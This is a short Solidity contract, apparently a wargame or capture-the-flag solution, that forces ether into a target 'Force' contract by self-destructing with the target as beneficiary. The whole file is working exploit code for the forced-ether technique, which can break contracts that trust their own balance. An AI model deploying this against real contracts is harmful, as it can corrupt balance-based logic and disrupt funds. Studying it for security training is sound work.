// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IForce.sol";

contract ForceAttack {
    IForce public immutable victimForce;

    constructor(IForce victimForce_) {
        victimForce = victimForce_;
    }

    function attack() external payable {
        require(0 < msg.value, "Force: Value must be gt 0");

        uint256 balance = address(victimForce).balance;

        selfdestruct(payable(address(victimForce)));

        require(
            balance != address(victimForce).balance,
            "Force: Attack failed"
        );
    }
}
